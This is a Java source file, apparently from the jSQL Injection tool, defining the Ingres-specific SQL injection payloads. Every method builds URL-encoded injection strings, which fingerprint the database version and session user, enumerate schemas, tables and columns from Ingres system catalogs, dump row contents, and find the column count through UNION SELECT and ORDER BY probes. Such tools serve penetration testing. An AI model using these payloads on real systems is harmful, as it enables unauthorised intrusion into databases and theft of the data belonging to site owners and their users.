package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class IngresVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "SELECT+dbmsinfo('_version')||'"+ SEPARATOR_SQL +"'||dbmsinfo('database')||'"+ SEPARATOR_SQL +"'||dbmsinfo('session_user')||0x01030307+r";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
            "where+t.schema_name>=t1.schema_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
            "where+t.table_name>=t1.table_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
            "where+t.column_name>=t1.column_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", "),''))||0x7f||trim(ifnull(varchar(");
        formatListColumn = "trim(ifnull(varchar(" + formatListColumn + "),''))";

        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "'SQLi'||substr(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
    }

    @Override
    public String getSqlIndicesCapacityCheck(String[] indexes) {
        return
            MediatorModel.model().getIndexesInUrl().replaceAll(
                "1337(" + StringUtil.join(indexes, "|") + ")7331",
                "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
            );
    }

    @Override
    public String getSqlIndices(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select+1337"+ i +"7330%2b1";
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")b+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
}